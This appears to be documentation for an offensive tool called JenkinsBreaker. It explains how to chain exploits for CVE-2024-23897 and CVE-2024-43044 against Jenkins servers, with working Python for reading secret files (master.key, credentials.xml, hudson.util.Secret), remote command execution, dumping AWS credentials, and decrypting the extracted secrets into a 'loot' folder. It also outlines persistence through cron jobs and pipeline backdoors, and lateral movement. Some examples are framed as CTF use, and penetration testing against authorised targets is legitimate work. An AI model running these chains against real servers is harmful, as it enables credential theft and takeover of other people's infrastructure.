# Exploit Chaining in JenkinsBreaker

This document explains how to chain multiple exploits together for complex attack scenarios.

## Overview

Exploit chaining allows you to:
- Execute multiple CVE exploits sequentially
- Build complex attack workflows (initial access → privilege escalation → persistence)
- Handle dependencies between exploit steps
- Implement conditional execution based on results
- Automate full compromise scenarios

## Chain Execution Flow

```
Initial Access → Credential Extraction → Privilege Escalation → Lateral Movement → Persistence
```

## Configuration-Based Chains

Define chains in `config/exploits.yaml`:

```yaml
chains:
  ctf_quick:
    description: "Fast CTF exploitation chain"
    exploits:
      - cve: "CVE-2024-23897"
        options:
          file_path: "/var/jenkins_home/secrets/master.key"
        on_success: extract_secrets
      
      - cve: "CVE-2024-23897"
        options:
          file_path: "/var/jenkins_home/credentials.xml"
        on_success: decrypt_credentials
```

## Programmatic Chains

Create chains in Python code:

```python
from exploits import exploit_registry, JenkinsSession

# Create session
session = JenkinsSession(
    target_url="http://localhost:8080",
    username="admin",
    password="admin"
)

# Define chain steps
steps = [
    {
        "cve": "CVE-2024-23897",
        "options": {"file_path": "/etc/passwd"},
        "description": "Enumerate users"
    },
    {
        "cve": "CVE-2024-43044",
        "options": {"mode": "full_rce", "command": "whoami"},
        "description": "Achieve RCE"
    }
]

# Execute chain
for step in steps:
    exploit = exploit_registry.get(step["cve"])
    result = exploit.run(session, **step["options"])
    
    if result.status != "success":
        print(f"Chain failed at: {step['description']}")
        break
```

## Pre-Defined Attack Chains

### 1. CTF Speed Run

Fast compromise for time-sensitive scenarios:

```bash
CVE-2024-23897 (File Read) → Extract master.key → Extract credentials.xml → Decrypt → Flag
```

**Usage:**
```python
from examples.exploit_chain import ExploitChain

chain = ExploitChain(session)
chain.execute([
    {"cve": "CVE-2024-23897", "options": {"file_path": "/var/jenkins_home/secrets/master.key"}},
    {"cve": "CVE-2024-23897", "options": {"file_path": "/var/jenkins_home/credentials.xml"}}
])
```

### 2. Full Infrastructure Compromise

Complete takeover with persistence:

```
Initial Access → RCE → Credential Dump → Lateral Movement → Persistence
```

**Steps:**
1. CVE-2024-23897: Read configuration files
2. CVE-2024-43044: Achieve RCE via cookie forgery
3. FEATURE-SCRIPT-CONSOLE: Execute post-exploitation recon
4. Extract credentials: AWS, SSH, Docker, NPM
5. Establish persistence: Cron jobs, pipeline backdoors
6. Lateral movement: SSH key reuse, AWS STS assume-role

**Implementation:**
```python
chain_steps = [
    {"cve": "CVE-2024-23897", "options": {"file_path": "/var/jenkins_home/config.xml"}},
    {"cve": "CVE-2024-43044", "options": {"mode": "full_rce", "command": "id"}},
    {"cve": "FEATURE-SCRIPT-CONSOLE", "options": {"command": "new File('/home/jenkins/.aws/credentials').text"}},
]

# Execute with state management
chain = ExploitChain(session)
chain.execute(chain_steps, stop_on_failure=False)
```

### 3. Stealth Enumeration

Low-impact reconnaissance:

```
Version Detection → Plugin Enumeration → Job Enumeration → Config Analysis
```

**Usage:**
```bash
python3 JenkinsBreaker.py --url http://target:8080 --enumerate --stealth
```

## Chain State Management

Chains can pass data between steps:

```python
class ExploitChain:
    def __init__(self, session):
        self.session = session
        self.state = {}  # Shared state across steps
    
    def execute_step(self, cve, options):
        result = exploit_registry.get(cve).run(self.session, **options)
        
        # Store result data in state
        if result.data:
            self.state.update(result.data)
        
        return result
```

**Example: Using extracted data in subsequent steps**

```python
# Step 1: Extract master.key
result1 = exploit.run(session, file_path="/var/jenkins_home/secrets/master.key")
chain.state["master_key"] = result1.data["content"]

# Step 2: Use master.key to decrypt credentials
from jenkins_breaker.infrastructure.cookie_forge import JenkinsSecrets

secrets = JenkinsSecrets(
    master_key=chain.state["master_key"],
    secret_key=chain.state["secret_key"]
)
```

## Conditional Execution

Execute steps based on previous results:

```python
# Execute RCE only if file read succeeds
result = exploit_registry.get("CVE-2024-23897").run(session, file_path="/etc/passwd")

if result.status == "success" and "root:x:0:0" in result.data.get("content", ""):
    print("[+] Root user found, proceeding with privilege escalation")
    rce_exploit = exploit_registry.get("CVE-2024-43044")
    rce_exploit.run(session, mode="full_rce", command="sudo -l")
```

## Error Handling and Rollback

Implement graceful failure and cleanup:

```python
class ExploitChain:
    def execute(self, steps, stop_on_failure=True, rollback_on_error=True):
        executed_steps = []
        
        for step in steps:
            try:
                result = self.execute_step(step["cve"], step["options"])
                executed_steps.append(step)
                
                if result.status != "success":
                    if stop_on_failure:
                        if rollback_on_error:
                            self.rollback(executed_steps)
                        return False
            
            except Exception as e:
                if rollback_on_error:
                    self.rollback(executed_steps)
                raise
        
        return True
    
    def rollback(self, executed_steps):
        """Cleanup artifacts from executed steps."""
        for step in reversed(executed_steps):
            exploit = exploit_registry.get(step["cve"])
            if hasattr(exploit, 'cleanup'):
                exploit.cleanup(self.session)
```

## Advanced Chaining Patterns

### Parallel Execution

Execute multiple exploits simultaneously:

```python
import concurrent.futures

def parallel_chain(session, exploits):
    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
        futures = []
        
        for exploit_config in exploits:
            exploit = exploit_registry.get(exploit_config["cve"])
            future = executor.submit(
                exploit.run,
                session,
                **exploit_config["options"]
            )
            futures.append(future)
        
        results = [f.result() for f in concurrent.futures.as_completed(futures)]
    
    return results
```

### Branching Chains

Different paths based on conditions:

```python
# Branch 1: If unauthenticated access works
if session.test_anonymous_access():
    chain = unauthenticated_chain
else:
    # Branch 2: Use credential-based exploits
    chain = authenticated_chain

execute_chain(session, chain)
```

## Chain Debugging

Enable verbose logging:

```python
import logging

logging.basicConfig(level=logging.DEBUG)

chain = ExploitChain(session)
chain.execute(steps, debug=True)
```

**Output:**
```
[DEBUG] Step 1/5: CVE-2024-23897
[DEBUG] Options: {'file_path': '/etc/passwd'}
[DEBUG] Result: success
[DEBUG] Data extracted: 1247 bytes
[DEBUG] State updated: {'passwd_content': '...'}
```

## Chain Performance Optimization

### Caching Results

Avoid redundant exploitation:

```python
class ExploitChain:
    def __init__(self, session):
        self.session = session
        self.cache = {}
    
    def execute_step(self, cve, options):
        cache_key = f"{cve}:{hash(frozenset(options.items()))}"
        
        if cache_key in self.cache:
            print(f"[*] Using cached result for {cve}")
            return self.cache[cache_key]
        
        result = exploit_registry.get(cve).run(self.session, **options)
        self.cache[cache_key] = result
        return result
```

### Timeout Management

Set per-step timeouts:

```python
import signal

def timeout_handler(signum, frame):
    raise TimeoutError("Exploit step timed out")

signal.signal(signal.SIGALRM, timeout_handler)
signal.alarm(60)  # 60 second timeout

try:
    result = exploit.run(session, **options)
finally:
    signal.alarm(0)  # Cancel timeout
```

## Integration with Jenkins-Credential-Decryptor

Seamless integration for credential extraction:

```python
from pathlib import Path
import subprocess

# Chain: Extract files → Decrypt
chain_steps = [
    {"cve": "CVE-2024-23897", "options": {"file_path": "/var/jenkins_home/secrets/master.key"}},
    {"cve": "CVE-2024-23897", "options": {"file_path": "/var/jenkins_home/secrets/hudson.util.Secret"}},
    {"cve": "CVE-2024-23897", "options": {"file_path": "/var/jenkins_home/credentials.xml"}},
]

chain = ExploitChain(session)
chain.execute(chain_steps)

# Save extracted files
loot_dir = Path("./loot")
loot_dir.mkdir(exist_ok=True)

# Decrypt with offsec-jenkins
subprocess.run([
    "python3", "../Jenkins-Credential-Decryptor/decrypt.py",
    "--key", str(loot_dir / "master.key"),
    "--secret", str(loot_dir / "hudson.util.Secret"),
    "--xml", str(loot_dir / "credentials.xml"),
    "--reveal-secrets"
])
```

## References

- [Exploit Modules Documentation](modules.md)
- [Configuration Examples](../config/exploits.yaml)
- [Chain Examples](../examples/exploit_chain.py)
- [MITRE ATT&CK Mapping](../README.md#mitre-attck-mapping)
